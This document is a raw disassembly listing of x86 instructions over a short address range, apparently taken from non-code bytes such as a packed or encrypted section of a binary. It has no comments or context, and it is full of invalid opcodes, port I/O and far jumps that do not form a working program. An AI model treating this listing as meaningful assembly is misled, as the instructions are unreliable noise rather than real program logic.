  4182b5:	mov    esp,0x5bf1655b
  4182ba:	push   cs
  4182bb:	xchg   ebp,eax
  4182bc:	push   ss
  4182bd:	dec    edi
  4182be:	jmp    esi
  4182c0:	call   0x841bb3b6
  4182c5:	daa    
  4182c6:	rcr    BYTE PTR [edx+0xa1ddd9c],0x8c
  4182cd:	retf   
  4182ce:	fcomp  QWORD PTR [edx-0x7ced3b83]
  4182d4:	mov    al,0x46
  4182d6:	out    dx,al
  4182d7:	mov    ecx,0x6f618acc
  4182dc:	mov    bh,0x1f
  4182de:	sar    BYTE PTR [ecx-0x1e9a45c6],1
  4182e4:	shr    BYTE PTR [ecx+0xa],0x2f
  4182e8:	(bad)  
  4182eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182ec:	out    dx,eax
  4182ed:	cmp    BYTE PTR [ebp+0x28],dl
  4182f0:	cmp    dl,al
  4182f2:	dec    esi
  4182f3:	mov    eax,0xbaf7dca9
  4182f8:	mov    ebp,DWORD PTR [edx+0x421edd66]
  4182fe:	adc    al,0x71
  418300:	ins    BYTE PTR es:[edi],dx
  418301:	jo     0x4182f4
  418303:	fbld   TBYTE PTR [edi+0x1]
  418306:	js     0x4182fb
  418308:	xchg   ebp,eax
  418309:	ins    DWORD PTR es:[edi],dx
  41830a:	jns    0x41833e
  41830c:	retf   
  41830d:	stos   BYTE PTR es:[edi],al
  41830e:	jp     0x418358
  418310:	test   BYTE PTR [ebp+0x34a30238],bh
  418316:	jb     0x41837b
  418318:	pop    edx
  418319:	sub    DWORD PTR [edi-0x19],0x93e4e06
  418320:	rol    BYTE PTR ds:0xdb6340aa,cl
  418326:	bound  ebx,QWORD PTR [edx+0x391add96]
  41832c:	jg     0x41831e
  41832e:	ja     0x4182fe
  418330:	lock (bad) [ebx]
  418333:	cmp    ah,al
  418335:	in     al,dx
  418336:	ret    
  418337:	dec    eax
  418338:	pop    edi
  418339:	or     DWORD PTR cs:[ebp+0x401cc17d],0x5f5bb20
  418344:	sbb    ah,BYTE PTR [eax+esi*4-0x5c]
  418348:	retf   0xbfd3
  41834b:	or     BYTE PTR [esi+esi*4+0x2d3cb255],bh
  418352:	jle    0x41831e
  418354:	xchg   ebp,eax
  418355:	push   esp
  418356:	cmc    
  418357:	aaa    
  418358:	stos   DWORD PTR es:[edi],eax
  418359:	stos   DWORD PTR es:[edi],eax
  41835a:	xchg   edx,eax
  41835b:	sahf   
  41835c:	sar    DWORD PTR [edi],0x5f
  41835f:	(bad)  
  418360:	xor    ebx,DWORD PTR [esi+ebp*4]
  418363:	push   ebp
  418364:	bound  eax,QWORD PTR [eax+edi*4-0x68]
  418368:	xor    ax,0x913a
  41836c:	idiv   DWORD PTR [esi]
  41836e:	mov    ebp,0x40dabae6
  418373:	sbb    bl,BYTE PTR [edi+0x4]
  418376:	(bad)  
  418377:	mov    al,0x7a
  418379:	sbb    bh,BYTE PTR [edi+0x39]
  41837c:	inc    eax
  41837d:	out    0x26,eax
  41837f:	mov    bh,0x76
  418381:	sahf   
  418382:	jns    0x418330
  418384:	js     0x4183ae
  418386:	and    eax,ebp
  418388:	mov    esi,0xce7d6a5b
  41838d:	sbb    eax,0xa514f388
  418392:	xchg   ecx,eax
  418393:	xchg   esi,eax
  418394:	das    
  418395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418396:	jecxz  0x41834f
  418398:	fst    DWORD PTR [ebp-0x6da0c802]
  41839e:	xchg   esi,eax
  41839f:	out    0xd,eax
  4183a1:	sbb    BYTE PTR [edx+0x1b],0x7f
  4183a5:	push   0x49
  4183a7:	sbb    eax,0xa86f986b
  4183ac:	push   ecx
  4183ad:	inc    edx
  4183ae:	mov    BYTE PTR [edx-0x75],dh
  4183b1:	pop    ds
  4183b2:	inc    ebp
  4183b3:	adc    eax,DWORD PTR [eax+0x3d15983b]
  4183b9:	and    DWORD PTR [esi-0x8],0xf385d47
  4183c0:	shr    BYTE PTR [ebx],cl
  4183c2:	dec    ecx
  4183c3:	rcl    DWORD PTR [eax+0x59],cl
  4183c6:	jo     0x418413
  4183c8:	test   al,0xee
  4183ca:	loope  0x418410
  4183cc:	pop    ds
  4183cd:	pop    esp
  4183ce:	pand   mm0,QWORD PTR [edx]
  4183d1:	inc    ebx
  4183d2:	mov    ah,BYTE PTR [edi-0x5fbd6cff]
  4183d8:	adc    DWORD PTR [edx],edx
  4183da:	and    bh,BYTE PTR [edx-0x3e10c02e]
  4183e0:	test   BYTE PTR [esi],dh
  4183e2:	(bad)  
  4183e3:	pop    ds
  4183e4:	inc    edx
  4183e5:	jl     0x4183f4
  4183e7:	in     eax,0xf5
  4183e9:	push   ss
  4183ea:	push   edi
  4183eb:	or     al,0xa6
  4183ed:	jmp    0x418403
  4183ef:	(bad)  
  4183f0:	iret   
  4183f1:	mov    ds:0x1d565da,al
  4183f6:	jbe    0x41837e
  4183f8:	(bad)  
  4183f9:	out    dx,eax
  4183fa:	pop    edi
  4183fb:	addr16 leave 
  4183fd:	enter  0x821f,0x7
  418401:	mov    ah,0x68
  418403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418404:	aam    0x38
  418406:	pop    esi
  418407:	sub    ecx,esi
  418409:	cdq    
  41840a:	repnz dec ecx
  41840c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41840e:	push   ecx
  41840f:	cdq    
  418410:	pop    es
  418411:	adc    eax,0x2b0dc697
  418416:	jmp    0x41839e
  418418:	sbb    ebx,DWORD PTR [ebp-0x68e98d5e]
  41841e:	mov    ecx,0xa898544e
  418423:	ins    BYTE PTR es:[edi],dx
  418424:	popf   
  418425:	in     eax,dx
  418426:	xor    esi,0x90a6a3b2
  41842c:	push   0x5cb22d42
  418431:	dec    edx
  418432:	fnstsw WORD PTR [ebx+0x3487c1d4]
  418438:	xchg   ebp,eax
  418439:	inc    edx
  41843a:	adc    bh,BYTE PTR [esi-0x21]
  41843d:	jle    0x4183c2
  41843f:	add    edi,esi
  418441:	into   
  418442:	call   0x641c:0x5f63c1ce
  418449:	cmp    al,0xef
  41844b:	sahf   
  41844c:	mov    bl,BYTE PTR [ebp-0x15acdb07]
  418452:	xchg   edi,eax
  418453:	xor    ebp,esi
  418455:	sub    ah,BYTE PTR [ebp+edx*4-0x73]
  418459:	popa   
  41845a:	out    dx,al
  41845b:	repz inc DWORD PTR [edx]
  41845e:	sub    al,0x73
  418460:	fs inc ebp
  418463:	jo     0x4184e1
  418465:	jg     0x4184bd
  418467:	jmp    0x5354be53
  41846c:	pop    ds
  41846d:	dec    eax
  41846e:	dec    esi
  41846f:	adc    eax,0x5c20f1aa
  418474:	or     al,BYTE PTR [ebp-0x7]
  418477:	add    eax,0x6d011eb0
  41847c:	lock or ah,al
  41847f:	pop    es
  418480:	dec    DWORD PTR [edx+eiz*1]
  418483:	or     eax,0x2e3525b5
  418488:	loop   0x4184d0
  41848a:	xor    ecx,DWORD PTR [edx+ecx*2]
  41848d:	pop    ss
  41848e:	mov    eax,0xd928b03d
  418493:	jnp    0x4184e6
  418495:	leave  
  418496:	xor    BYTE PTR [edi+0xa],bh
  418499:	stos   DWORD PTR es:[edi],eax
  41849a:	(bad)  
  41849b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41849c:	out    0xe2,eax
  41849e:	out    0xae,eax
  4184a0:	clc    
  4184a1:	push   esp
  4184a2:	mov    ch,0x7f
  4184a4:	mov    ds:0x2259b755,al
  4184a9:	mov    dl,0x2a
  4184ab:	inc    eax
  4184ac:	inc    ebx
  4184ad:	pop    ebx
  4184ae:	push   ecx
  4184af:	icebp  
  4184b0:	pop    ds
  4184b1:	mov    eax,ds:0x158aee3e
  4184b6:	mov    ch,0x30
  4184b8:	rol    esp,0xd4
  4184bb:	outs   dx,BYTE PTR ds:[esi]
  4184bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184bd:	add    bl,bl
  4184bf:	inc    esi
  4184c0:	mov    al,ds:0x2356868d
  4184c5:	call   0x4319:0xfad53c63
  4184cc:	out    0x31,eax
  4184ce:	mov    edi,es
  4184d0:	jns    0x41853d
  4184d2:	pop    ebp
  4184d3:	and    eax,DWORD PTR [edx]
  4184d5:	xchg   esi,eax
  4184d6:	add    BYTE PTR [ebp+0x32],0xca
  4184da:	sti    
  4184db:	or     al,0x83
  4184dd:	dec    eax
  4184de:	sbb    DWORD PTR [edx+0x37e3aa7d],edi
  4184e4:	lock mov edi,0x5182cc9a
  4184ea:	loop   0x418528
  4184ec:	loope  0x418470
  4184ee:	pusha  
  4184ef:	mov    WORD PTR [ebx-0x31],ds
  4184f2:	jle    0x4184aa
  4184f4:	aas    
  4184f5:	xchg   edi,eax
  4184f6:	mov    al,ds:0x576fd9cb
  4184fb:	xor    edi,edi
  4184fd:	push   edx
  4184fe:	(bad)  
  4184ff:	sbb    ch,BYTE PTR [ebp+0xb]
  418502:	push   es
  418503:	test   BYTE PTR [edi],cl
  418505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418506:	aas    
  418507:	jnp    0x41848b
  418509:	mov    dh,0x82
  41850b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850c:	jp     0x4184cb
  41850e:	dec    ebx
  41850f:	loop   0x41854f
  418511:	cmp    BYTE PTR [edx+0x43597217],cl
  418517:	add    BYTE PTR [edi+eax*4+0x54],bh
  41851b:	loope  0x4184c2
  41851d:	jo     0x41855e
  41851f:	repz fs inc esp
  418522:	dec    ebx
  418523:	mov    al,ds:0x5420a0ec
  418528:	or     DWORD PTR [esi-0x29169e5d],esp
  41852e:	sub    BYTE PTR [ebx],0x9
  418531:	test   eax,0x5c402f5d
  418536:	mov    ds:0x26ae95c3,eax
  41853b:	out    0x11,eax
  41853d:	out    0xd,eax
  41853f:	jnp    0x418533
  418541:	mov    dh,BYTE PTR [edx-0x4320bd5a]
  418547:	cdq    
  418548:	push   ss
  418549:	mov    ebx,0xd6c41f60
  41854e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41854f:	ins    DWORD PTR es:[edi],dx
  418550:	add    BYTE PTR [edx-0x435e1775],al
  418556:	mov    bl,0xd
  418558:	adc    BYTE PTR [eax-0x717922c2],ch
  41855e:	(bad)
  418561:	or     al,0x7e
  418563:	or     ch,BYTE PTR [eax-0x36]
  418566:	cdq    
  418567:	and    DWORD PTR [eax-0x42],esi
  41856a:	dec    ecx
  41856b:	(bad)  
  41856c:	jbe    0x41856f
  41856e:	inc    ecx
  41856f:	rol    al,0x4b
  418572:	mov    esi,0xb6983a52
  418577:	push   esi
  418578:	pop    esp
  418579:	test   BYTE PTR [edi+0x58566066],cl
  41857f:	pop    ebx
  418580:	xchg   esi,eax
  418581:	ja     0x418520
  418583:	push   ebp
  418584:	loopne 0x41856f
  418586:	shl    BYTE PTR [esi+0x3fab14fb],0x5f
  41858d:	je     0x4185c7
  41858f:	scas   eax,DWORD PTR es:[edi]
  418590:	mov    BYTE PTR [eax],dh
  418592:	int3   
  418593:	mov    esp,0xd79d5467
  418598:	cwde   
  418599:	daa    
  41859a:	jp     0x4185ea
  41859c:	jg     0x418566
  41859e:	sub    eax,0xbd39a03a
  4185a3:	dec    ecx
  4185a4:	aam    0xb4
  4185a6:	sbb    BYTE PTR ds:0xcfdc4036,cl
  4185ac:	cwde   
  4185ad:	fldln2 
  4185af:	retf   
  4185b0:	mov    es:0x41e0a668,al
  4185b6:	jne    0x41860d
  4185b8:	mov    al,0x6f
  4185ba:	loopne 0x418564
  4185bc:	arpl   sp,si
  4185be:	mov    ebp,0x310f4dd8
  4185c3:	mov    DWORD PTR [ebx+0x3d84e8ae],eax
  4185c9:	jbe    0x4185b5
  4185cb:	xor    BYTE PTR [edx],bh
  4185cd:	scas   eax,DWORD PTR es:[edi]
  4185ce:	mov    ds:0xcbd617dc,eax
  4185d3:	dec    eax
  4185d4:	(bad)  
  4185d5:	push   cs
  4185d6:	pop    ds
  4185d7:	sub    al,BYTE PTR [edi+0x59bca4ac]
  4185dd:	mov    ecx,0xe3f09e1f
  4185e2:	sub    BYTE PTR [ebp-0x33e3c991],al
  4185e8:	mov    ch,0xef
  4185ea:	mov    ch,0x13
  4185ec:	push   esp
  4185ed:	mov    gs,WORD PTR [esi+edi*8+0x19]
  4185f1:	sub    eax,ebx
  4185f3:	call   0x6f0a:0xce7cbdb
  4185fa:	jmp    0x7d97:0x543bde0
  418601:	(bad)  
  418602:	and    DWORD PTR ds:0x182a248d,ecx
  418608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418609:	mov    edx,0x4bec3ea1
  41860e:	inc    ecx
  41860f:	outs   dx,BYTE PTR ds:[esi]
  418610:	cmp    eax,0xe2280d64
  418615:	outs   dx,DWORD PTR ds:[esi]
  418616:	mov    ah,BYTE PTR [ecx-0xf]
  418619:	rcl    ah,1
  41861b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861c:	aaa    
  41861d:	and    al,0xfb
  41861f:	(bad)  
  418620:	cmp    eax,DWORD PTR [ebx]
  418622:	jmp    0x64b4:0xef778f0b
  418629:	mov    ebx,0x31579236
  41862e:	mov    DWORD PTR fs:[eax],ecx
  418631:	push   0xffffffdc
  418633:	inc    DWORD PTR [ebx-0xb]
  418636:	jp     0x4185cb
  418638:	lods   al,BYTE PTR ds:[esi]
  418639:	mov    al,ds:0x77845ec
  41863e:	fsubr  st(3),st
  418640:	in     eax,0x6d
  418642:	cli    
  418643:	add    DWORD PTR [edi],eax
  418645:	cmp    BYTE PTR [ecx+0xe],0xf
  418649:	ins    DWORD PTR es:[edi],dx
  41864a:	imul   edi,DWORD PTR [edx],0xe619eb47
  418650:	je     0x418671
  418652:	in     eax,0xb2
  418654:	or     eax,DWORD PTR [ebx]
  418656:	add    DWORD PTR [ebx+edx*4+0x2161cc31],eax
  41865d:	mov    al,0xea
  41865f:	call   0x87ebc8fe
  418664:	and    bl,dh
  418666:	cs sbb al,0xff
  418669:	int    0xa2
  41866b:	test   eax,0x78bdf2fb
  418670:	mov    dl,0xed
  418672:	lds    eax,FWORD PTR [ebp+0x1f]
  418675:	push   cs
  418676:	pop    ds
  418677:	daa    
  418678:	(bad)  
  418679:	sub    edx,ecx
  41867b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41867c:	mov    ecx,0x8509529
  418681:	sub    DWORD PTR [esp+edi*8+0x6accafea],esp
  418688:	loopne 0x4186f1
  41868a:	cdq    
  41868b:	fnsave [esi+0x5c]
  41868e:	jnp    0x41870e
  418690:	sar    BYTE PTR [edx+0xde719b],cl
  418696:	aaa    
  418697:	push   esp
  418698:	jno    0x4186fb
  41869a:	cmp    dh,ah
  41869c:	stos   BYTE PTR es:[edi],al
  41869d:	adc    BYTE PTR [edx+eax*2+0x77ab1ea0],bh
  4186a4:	(bad)  
  4186a5:	mov    ebx,DWORD PTR [eax+0x6e098395]
  4186ab:	cwde   
  4186ac:	(bad)
  4186af:	sub    DWORD PTR ds:0xeb81f3a0,0xffffff95
  4186b6:	clc    
  4186b7:	shl    DWORD PTR [esi-0x24],cl
  4186ba:	xchg   ecx,eax
  4186bb:	mov    WORD PTR [ebx-0x2a],?
  4186be:	rcl    BYTE PTR [esi+0x18],1
  4186c1:	add    esp,DWORD PTR [edx-0x17737aa3]
  4186c7:	ds pop ebx
  4186c9:	out    0x4b,al
  4186cb:	mov    eax,0x45ceb4a
  4186d0:	sahf   
  4186d1:	retf   
  4186d2:	lock jns 0x4186a3
  4186d5:	push   ebp
  4186d6:	jns    0x418720
  4186d8:	cdq    
  4186d9:	mov    eax,eax
  4186db:	fmulp  st(0),st
  4186dd:	dec    esi
  4186de:	adc    al,0xb9
  4186e0:	cmp    edx,DWORD PTR [esi]
  4186e2:	and    BYTE PTR [edx+0x2a885904],al
  4186e8:	rol    DWORD PTR [ecx+0x8],1
  4186eb:	dec    eax
  4186ec:	push   esi
  4186ed:	pop    esi
  4186ee:	lahf   
  4186ef:	xchg   esi,eax
  4186f0:	imul   ecx,DWORD PTR [esp+esi*1],0xffffffe7
  4186f4:	enter  0xa6c,0xe8
  4186f8:	hlt    
  4186f9:	xchg   bl,ah
  4186fb:	(bad)  
  4186fc:	mov    edi,0xd5caca1e
  418701:	shr    DWORD PTR [edx],cl
  418703:	lea    eax,[ecx+0x78]
  418706:	push   es
  418707:	cmp    ah,BYTE PTR [edi]
  418709:	mov    BYTE PTR [esi-0x5d5f653a],bl
  41870f:	test   DWORD PTR [ecx+0x3d150f15],eax
  418715:	enter  0x7935,0x2a
  418719:	push   0xffffffd6
  41871b:	push   esi
  41871c:	imul   ecx,DWORD PTR [ebp-0x77],0x4c
  418720:	jp     0x418701
  418722:	push   ebx
  418723:	imul   esp,DWORD PTR [ebp-0x10],0x8f7df9e3
  41872a:	je     0x418728
  41872c:	xchg   BYTE PTR [ecx],bl
  41872e:	or     BYTE PTR [edx-0x60],ah
  418731:	cmp    BYTE PTR [ecx+0x7f1e1b2f],ch
  418737:	mov    WORD PTR [esi+0x604f6512],?
  41873d:	bound  edi,QWORD PTR [esi+esi*4-0x24c3721b]
  418744:	push   ebx
  418745:	or     ebp,ebx
  418747:	bnd js 0x418735
  41874a:	sbb    ah,BYTE PTR [ebx+0x14780a91]
  418750:	sub    eax,0x4d157884
  418755:	pop    edx
  418756:	pop    edi
  418757:	sbb    DWORD PTR [ebp+0x52],ebp
  41875a:	cmp    eax,0xa7a968c0
  41875f:	ja     0x4187ae
  418761:	sahf   
  418762:	add    bh,dl
  418764:	popa   
  418765:	push   esp
  418766:	push   cs
  418767:	inc    ebx
  418768:	mov    ah,bl
  41876a:	mov    DWORD PTR [edi-0x42dbf73b],esp
  418770:	imul   eax,DWORD PTR [ebx],0xfabfd9ff
  418776:	jl     0x4187eb
  418778:	aam    0xf2
  41877a:	push   cs
  41877b:	cmp    BYTE PTR [eax+eiz*8+0x4],ch
  41877f:	jbe    0x418726
  418781:	jae    0x418703
  418783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418784:	jbe    0x4187df
  418786:	pop    ebp
  418787:	adc    BYTE PTR [ebp-0x6f9b73f],0xe4
  41878e:	ret    
  41878f:	and    BYTE PTR [edi+0x2e],cl
  418792:	jp     0x41871d
  418794:	jb     0x4187f9
  418796:	or     al,0x80
  418798:	or     dl,BYTE PTR [edx]
  41879a:	fst    st(7)
  41879c:	inc    edi
  41879d:	cmp    edi,esi
  41879f:	test   DWORD PTR [edi-0xe1a7437],0x13e99afc
  4187a9:	jmp    0x41fa:0xac29e1b5
  4187b0:	push   ds
  4187b1:	imul   esi,DWORD PTR [edi+eax*4-0x28],0x3c
  4187b6:	ret    0x7772
  4187b9:	cwde   
  4187ba:	push   edx
  4187bb:	mul    BYTE PTR [ebp-0x4c]
  4187be:	std    
  4187bf:	fldenv [edi+0x5e73c2ea]
  4187c5:	mov    bh,0x5a
  4187c7:	mov    al,ds:0xb36f2496
  4187cc:	wbinvd 
  4187ce:	xchg   edi,eax
  4187cf:	icebp  
  4187d0:	test   BYTE PTR [esi+0x10],cl
  4187d3:	fwait
  4187d4:	out    0x9f,eax
  4187d6:	retf   
  4187d7:	shl    DWORD PTR [ebx-0x52],0x39
  4187db:	mov    DWORD PTR [esi+ebx*8+0x7c],eax
  4187df:	std    
  4187e0:	psrad  mm2,mm1
  4187e3:	std    
  4187e4:	aaa    
  4187e5:	jbe    0x4187c1
  4187e7:	scas   al,BYTE PTR es:[edi]
  4187e8:	sub    dh,al
  4187ea:	faddp  st(6),st
  4187ec:	fldcw  WORD PTR [eax-0x4aaa662d]
  4187f2:	mov    BYTE PTR [eax+edx*1],0xcf
  4187f6:	scas   eax,DWORD PTR es:[edi]
  4187f7:	or     cl,bl
  4187f9:	or     BYTE PTR [ecx-0x2b76a8e7],dl
  4187ff:	lahf   
  418800:	jmp    0x3b714354
  418805:	push   es
  418806:	cmp    eax,0x78d15685
  41880b:	sbb    BYTE PTR ds:0x4f32354e,al
  418811:	outs   dx,BYTE PTR ds:[esi]
  418812:	inc    ecx
  418813:	dec    ecx
  418814:	das    
  418815:	adc    ebp,ecx
  418817:	sbb    BYTE PTR [ebx],dh
  418819:	mov    ch,0x73
  41881b:	int3   
  41881c:	test   DWORD PTR [edi-0x39b7cead],edi
  418822:	cmp    BYTE PTR [ecx],ah
  418824:	cmp    al,0xb2
  418826:	mov    esi,0xeed0177c
  41882b:	pop    ds
  41882c:	test   BYTE PTR [edx],bl
  41882e:	add    al,0x5f
  418830:	adc    BYTE PTR [ecx],dl
  418832:	push   edi
  418833:	jmp    0x4187e2
  418835:	mov    esi,esi
  418837:	add    al,0xb
  418839:	call   0xd29afc52
  41883e:	imul   ebp,DWORD PTR [ecx-0x38],0x4e949e55
  418845:	sbb    al,0xcb
  418847:	mov    edi,0xa4d6cdcf
  41884c:	adc    ebx,DWORD PTR [edi]
  41884e:	loop   0x4187fb
  418850:	ds xchg ebx,eax
  418852:	adc    BYTE PTR [edx-0x24],cl
  418855:	mov    eax,0xb698bb8b
  41885a:	mov    eax,ds:0x268654df
  41885f:	pop    ebp
  418860:	xchg   ebp,eax
  418861:	hlt    
  418862:	mov    es,WORD PTR [ebx]
  418864:	scas   al,BYTE PTR es:[edi]
  418865:	add    al,0xbc
  418867:	mov    ch,0x12
  418869:	mov    eax,0x46aa92b8
  41886e:	pop    ds
  41886f:	loop   0x4188b1
  418871:	adc    BYTE PTR [ebp+0x73b1a03],bh
  418877:	(bad)  
  418878:	sub    DWORD PTR ds:0xb0d333cf,edi
  41887e:	xor    ch,bh
  418880:	jge    0x41882d
  418882:	aas    
  418883:	mov    al,0x23
  418885:	cdq    
  418886:	mov    eax,DWORD PTR [esi+0x53]
  418889:	(bad)  
  41888a:	xchg   ebx,eax
  41888b:	pop    ecx
  41888c:	mov    al,0xe6
  41888e:	xabort 0xab
  418891:	dec    ebx
  418892:	fs dec edi
  418894:	sbb    ch,BYTE PTR [eax]
  418896:	shr    ah,cl
  418898:	cmp    esi,eax
  41889a:	dec    edx
  41889b:	sub    al,0x8
  41889d:	cmp    edx,DWORD PTR [esi*1+0x77abe44e]
  4188a4:	das    
  4188a5:	add    eax,0x410a8213
  4188aa:	aad    0xce
  4188ac:	mov    dl,0x97
  4188ae:	nop
  4188af:	fucom  st(7)
  4188b1:	inc    edi
  4188b2:	mov    dl,0x1e
  4188b4:	ss and eax,0x23a61246
  4188ba:	repnz mov eax,ss
  4188bd:	loopne 0x4188f9
  4188bf:	sbb    ebx,ecx
  4188c1:	stos   DWORD PTR es:[edi],eax
  4188c2:	xchg   edi,eax
  4188c3:	sbb    esp,DWORD PTR [edx+0x4b0f39ae]
  4188c9:	lahf   
  4188ca:	mov    al,ds:0x8faff596
  4188cf:	rcr    BYTE PTR [ecx],cl
  4188d1:	fimul  WORD PTR [ecx+0x18]
  4188d4:	mul    ebx
  4188d6:	xor    ah,BYTE PTR [eax+0x51e2b3c7]
  4188dc:	cld    
  4188dd:	loope  0x41886d
  4188df:	xchg   esi,eax
  4188e0:	adc    edi,DWORD PTR [edx]
  4188e2:	add    BYTE PTR [ecx],bh
  4188e4:	popf   
  4188e5:	push   0xffffffed
  4188e7:	out    dx,al
  4188e8:	sbb    al,0x2
  4188ea:	js     0x4188d2
  4188ec:	or     eax,0xdbf1dd41
  4188f1:	dec    esi
  4188f2:	jg     0x41892b
  4188f4:	cs cmc 
  4188f6:	jle    0x4188fa
  4188f8:	pop    ds
  4188f9:	cmp    BYTE PTR [ecx+0x776c19b8],0x26
  418900:	sub    eax,0xc1d8ac6c
  418905:	add    eax,0x96b1cb45
  41890a:	dec    ebp
  41890b:	out    dx,eax
  41890c:	pop    ecx
  41890d:	ins    BYTE PTR es:[edi],dx
  41890e:	pop    es
  41890f:	sti    
  418910:	fidivr DWORD PTR [ecx+0x2a60d0b5]
  418916:	mov    eax,cs
  418918:	xchg   esp,eax
  418919:	call   0x35b4:0xa3e5c0b6
  418920:	les    edx,FWORD PTR [ebp-0x17444387]
  418926:	mov    esp,0x3369e4c4
  41892b:	mov    bl,0xc9
  41892d:	cmp    BYTE PTR es:[edx],bl
  418930:	lods   eax,DWORD PTR ds:[esi]
  418931:	ins    BYTE PTR es:[edi],dx
  418932:	pop    edx
  418933:	push   ecx
  418934:	mov    WORD PTR ds:0x7a2dc1a9,ds
  41893a:	pop    ebp
  41893b:	jnp    0x41894f
  41893d:	cmp    DWORD PTR [ebx+0x3bff7933],eax
  418943:	ds je  0x418999
  418946:	sbb    eax,0x8a7980a9
  41894b:	push   0xfffffffb
  41894d:	xlat   BYTE PTR ds:[ebx]
  41894e:	loop   0x41892b
  418950:	adc    BYTE PTR [edx],cl
  418952:	data16 icebp 
  418954:	test   bh,0x58
  418957:	add    bh,BYTE PTR [ecx]
  418959:	sub    BYTE PTR [ebx+0x4fa23f93],bh
  41895f:	mov    ch,0x9b
  418961:	scas   al,BYTE PTR es:[edi]
  418962:	fs (bad) 
  418964:	cmp    al,0x93
  418966:	mov    edx,0x230854b2
  41896b:	xchg   dh,ch
  41896d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41896e:	pop    ebx
  41896f:	lods   al,BYTE PTR ds:[esi]
  418970:	sahf   
  418971:	lods   eax,DWORD PTR ds:[esi]
  418972:	push   ebp
  418973:	iret   
  418974:	mov    esp,ebp
  418976:	mov    dh,0x82
  418978:	ja     0x41890c
  41897a:	fadd   DWORD PTR [ebp-0x54]
  41897d:	xchg   ecx,eax
  41897e:	ror    BYTE PTR [edi+0x2b],0xbb
  418982:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418983:	aaa    
  418984:	sub    DWORD PTR [ecx+0xf3d4a0d],ebx
  41898a:	std    
  41898b:	and    DWORD PTR [ebx+ebp*4-0x3a1ca248],esp
  418992:	cmovle eax,DWORD PTR [eax-0x4bb70b89]
  418999:	leave  
  41899a:	jne    0x41891f
  41899c:	dec    esp
  41899d:	pop    edx
  41899e:	sub    eax,0x91162bce
  4189a3:	mov    esp,DWORD PTR [edi-0x1]
  4189a6:	das    
  4189a7:	jmp    0x9d9f:0x8f72441d
  4189ae:	ja     0x4189ce
  4189b0:	aam    0x6
  4189b2:	lds    ebp,FWORD PTR [ebx+eiz*8+0x2]
  4189b6:	dec    eax
  4189b7:	stos   BYTE PTR es:[edi],al
  4189b8:	mov    dh,bh
  4189ba:	test   esp,eax
  4189bc:	xor    eax,0x9dbe91a5
  4189c1:	ror    ebp,1
  4189c3:	sar    DWORD PTR [eax],0x3b
  4189c6:	cdq    
  4189c7:	aas    
  4189c8:	adc    eax,0x15cb6d6e
  4189cd:	(bad)  
  4189ce:	out    0x99,al
  4189d0:	ret    0x8f87
  4189d3:	test   al,0x2e
  4189d5:	add    eax,0xa9d8fece
  4189da:	retf   
  4189db:	repz rol dl,cl
  4189de:	clc    
  4189df:	in     eax,0xcb
  4189e1:	mov    ebp,0x4b880204
  4189e6:	add    BYTE PTR [eax],0x64
  4189e9:	cdq    
  4189ea:	ror    dh,cl
  4189ec:	jge    0x4189ec
  4189ee:	pusha  
  4189ef:	in     al,0x85
  4189f1:	pop    ebp
  4189f2:	add    esi,DWORD PTR [ebp+ebp*4+0x748f307d]
  4189f9:	sub    DWORD PTR ds:0x8ef37e4b,edi
  4189ff:	adc    DWORD PTR [ecx],esi
  418a01:	fisubr DWORD PTR [ecx]
  418a03:	dec    edx
  418a04:	es cs test eax,0x42ac28ff
  418a0b:	add    eax,0x2e2d006a
  418a10:	icebp  
  418a11:	cs (bad) 
  418a13:	dec    ecx
  418a15:	jle    0x418a16
  418a17:	outs   dx,BYTE PTR ds:[esi]
  418a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a19:	push   esi
  418a1a:	stos   BYTE PTR es:[edi],al
  418a1b:	mov    ebp,0xc2124585
  418a20:	sub    DWORD PTR [eax],esi
  418a22:	popf   
  418a23:	mov    cs,WORD PTR [edi]
  418a25:	ficom  DWORD PTR [esi+0xf980962]
  418a2b:	clc    
  418a2c:	(bad)  
  418a2d:	ss mov edx,0x9dae2a11
  418a33:	ret    
  418a34:	loopne 0x4189f8
  418a36:	jg     0x4189b9
  418a38:	jns    0x418ab9
  418a3a:	retf   0x31a8
  418a3d:	icebp  
  418a3e:	and    al,0x74
  418a40:	js     0x4189ea
  418a42:	and    al,0x6
  418a44:	in     eax,dx
  418a45:	bound  ebx,QWORD PTR [edx+eax*4+0x92ad459]
  418a4c:	jno    0x418a9d
  418a4e:	test   eax,0x4325de7
  418a53:	test   al,0xcb
  418a55:	lds    esp,FWORD PTR [ecx+eiz*2-0x3]
  418a59:	xor    esi,DWORD PTR [eax-0x1c]
  418a5c:	jecxz  0x418a04
  418a5e:	outs   dx,BYTE PTR ds:[esi]
  418a5f:	int    0x9c
  418a61:	push   ds
  418a62:	push   eax
  418a63:	dec    ecx
  418a64:	popa   
  418a65:	mov    esp,?
  418a67:	hlt    
  418a68:	push   0x60dc500e
  418a6d:	bswap  esp
  418a6f:	and    al,0x5b
  418a71:	aam    0xc4
  418a73:	or     eax,0xc832deca
  418a78:	sub    ch,BYTE PTR [ebx+0x63]
  418a7b:	leave  
  418a7c:	in     eax,dx
  418a7d:	pop    esp
  418a7e:	fcom   DWORD PTR [ebx-0x6f1c8960]
  418a84:	jo     0x418a5a
  418a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a87:	inc    ebx
  418a88:	xor    BYTE PTR [ecx+0x2f],dl
  418a8b:	scas   eax,DWORD PTR es:[edi]
  418a8c:	or     DWORD PTR [ecx+0x2050d74b],eax
  418a92:	cmp    al,0x61
  418a94:	push   0xfd76dcf2
  418a99:	jnp    0x418a56
  418a9b:	jg     0x418a8e
